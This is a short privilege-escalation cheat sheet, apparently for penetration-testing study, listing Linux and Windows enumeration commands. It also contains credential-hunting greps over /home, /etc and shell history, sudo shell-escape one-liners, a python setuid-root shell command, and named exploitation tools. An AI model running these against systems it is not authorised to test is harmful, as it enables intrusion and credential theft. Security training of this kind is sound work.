PRIVILEGE ESCALATION CHEATSHEET

---
MINDSET
---

* Enumerate first, exploit later
* Look for:

  * Misconfigurations
  * Weak permissions
  * Credential reuse
* Tools help, but manual enumeration is key

---
LINUX PRIVESC
---

[1] BASIC ENUM
whoami
id
hostname
uname -a
cat /etc/os-release

[2] FILE ENUMERATION
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -name "*.conf" 2>/dev/null

[3] PASSWORD HUNTING
grep -r "password" /home 2>/dev/null
grep -r "pass" /etc 2>/dev/null
cat ~/.bash_history

[4] SUID
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation

[5] SUDO
sudo -l

# Examples:

sudo vim -c '!sh'
sudo find . -exec /bin/sh ; -quit

[6] CRON JOBS
crontab -l
cat /etc/crontab
ls -la /etc/cron*

[7] PATH HIJACKING
echo $PATH

# Check writable directories

[8] CAPABILITIES
getcap -r / 2>/dev/null

# Example exploit:

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

[9] KERNEL EXPLOIT
uname -r

# Use searchsploit / public exploits

[10] AUTO ENUM TOOLS
linpeas.sh
linenum.sh

---
WINDOWS PRIVESC
---

[1] BASIC ENUM
whoami
whoami /priv
systeminfo

[2] PASSWORD HUNTING
findstr /si password *.txt *.xml *.ini

[3] UNQUOTED SERVICE PATH
wmic service get name,displayname,pathname,startmode

[4] WEAK SERVICE PERMISSIONS
accesschk.exe -uwcqv "Authenticated Users" *

[5] ALWAYSINSTALL ELEVATED
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

[6] TOKEN IMPERSONATION

# Tools:

JuicyPotato
PrintSpoofer

[7] SCHEDULED TASKS
schtasks /query /fo LIST /v

[8] DLL HIJACKING

# Check writable directories in PATH

[9] AUTO ENUM TOOLS
winPEAS.exe
PowerUp.ps1


---
REMINDER
---

If stuck:
You are probably missing something in enumeration.
